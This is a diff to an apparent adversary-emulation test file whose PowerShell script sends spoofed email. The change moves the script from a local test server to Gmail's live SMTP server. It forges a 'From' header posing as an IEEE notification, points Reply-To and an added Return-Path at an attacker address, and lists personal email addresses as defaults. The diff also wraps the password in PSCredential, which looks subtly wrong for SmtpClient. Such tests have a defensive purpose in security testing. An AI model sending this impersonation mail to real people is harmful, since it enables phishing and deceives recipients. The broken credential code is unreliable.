@@ -12,23 +12,23 @@ atomic_tests:
       smtp_server:
         description: SMTP server to use
         type: string
-        default: "localhost"  # Use localhost for testing (e.g., hMailServer or Postfix)
+        default: "smtp.gmail.com"  # Use Gmail's SMTP server for testing
       smtp_port:
         description: SMTP port
         type: integer
-        default: 25  # Standard SMTP port for hMailServer
+        default: 587  # Use port 587 for TLS
       sender_email:
         description: Real email address for SMTP authentication (Return-Path)
         type: string
         default: "chaymaoumayma2003@gmail.com"  # Replace with your domain for Return-Path
-      spoofed_from_email:
+      sender_visible_email:
         description: Email address to spoof in the "From" header
         type: string
         default: "IEEE Notification <chaymabouattour@ieee.org>"  # Spoofed email address
       reply_to_email:
         description: Reply-To email address
         type: string
-        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
+        default: "attacker@spoof-test.tn"  # Falsified Reply-To and Return-Path
       recipient_email:
         description: Recipient email address
         type: string
@@ -65,8 +65,8 @@ atomic_tests:
         $smtpServer = "#{smtp_server}"
         $smtpPort = #{smtp_port}
         $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
-        $spoofedFromEmail = "#{spoofed_from_email}"  # Spoofed address in the From header
-        $replyToEmail = "#{reply_to_email}"  # Reply-To address
+        $senderVisibleEmail = "#{sender_visible_email}"  # Address visible in the "From" field
+        $replyToEmail = "#{reply_to_email}"  # Reply-To email address
         $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
         $body = "#{body}"
@@ -82,8 +82,9 @@ atomic_tests:
         $mailMessage.IsBodyHtml = $true
 
         # Add custom headers for spoofing
-        $mailMessage.Headers.Add("From", $spoofedFromEmail)  # Spoofed From header
+        $mailMessage.Headers.Add("From", $senderVisibleEmail)  # Spoofed From header
         $mailMessage.Headers.Add("Reply-To", $replyToEmail)
+        $mailMessage.Headers.Add("Return-Path", $replyToEmail)  # Falsified Return-Path
         $mailMessage.Headers.Add("X-Priority", "1")
         $mailMessage.Headers.Add("X-MSMail-Priority", "High")
         $mailMessage.Headers.Add("Importance", "High")
@@ -99,8 +100,8 @@ atomic_tests:
 
         # Configure SMTP client
         $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
-        $smtpClient.EnableSsl = $false  # Disable SSL for local SMTP server
-        $smtpClient.Credentials = New-Object System.Net.NetworkCredential($senderEmail, $appPassword)
+        $smtpClient.EnableSsl = $true  # Enable SSL for Gmail
+        $smtpClient.Credentials = New-Object System.Management.Automation.PSCredential($senderEmail, $appPassword)
 
         # Send the email
         try {
